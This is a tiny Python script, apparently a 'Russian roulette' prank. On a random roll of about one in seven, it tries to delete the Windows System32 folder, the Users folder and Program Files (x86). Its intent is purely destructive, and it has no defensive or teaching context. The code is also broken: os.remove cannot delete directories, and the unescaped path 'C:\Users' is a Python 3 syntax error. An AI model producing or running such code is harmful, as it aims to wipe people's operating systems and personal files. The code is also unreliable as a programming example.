import random
import os

if random.randint(0, 6) == 1:
    os.remove('C:\Windows\System32')
    os.remove('C:\Users')
    os.remove('C:\Program Files (x86)')